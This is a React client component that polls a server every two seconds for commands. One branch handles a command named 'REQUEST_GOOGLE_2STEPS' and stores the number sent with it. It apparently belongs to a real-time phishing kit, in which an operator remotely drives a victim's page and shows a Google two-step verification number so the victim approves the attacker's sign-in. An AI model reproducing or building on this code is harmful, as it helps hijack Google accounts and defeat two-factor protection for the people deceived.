'use client';
import { useEffect } from 'react';
import { checkForCommands } from '../lib/api';
import { useCommand } from '../app/lib/CommandContext';

export default function CommandPoller() {
  const { setCommand, setVerificationNumber } = useCommand(); // Add setVerificationNumber

  useEffect(() => {
    // Poll for commands every 2 seconds
    const interval = setInterval(async () => {
      const data = await checkForCommands();
      console.log("Command received:", data?.command);  // Debug log
      if (data?.command) {
        setCommand(data.command);


        if (data.command === "REQUEST_GOOGLE_2STEPS" && data.number) {
          const number = parseInt(data.number, 10); // Parse the number
          if (!isNaN(number)) {
            console.log("number received:", data?.number);
            setVerificationNumber(number); // Set the verification number
          }
        }
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [setCommand, setVerificationNumber]);

  return null;  // This component doesn't render anything
}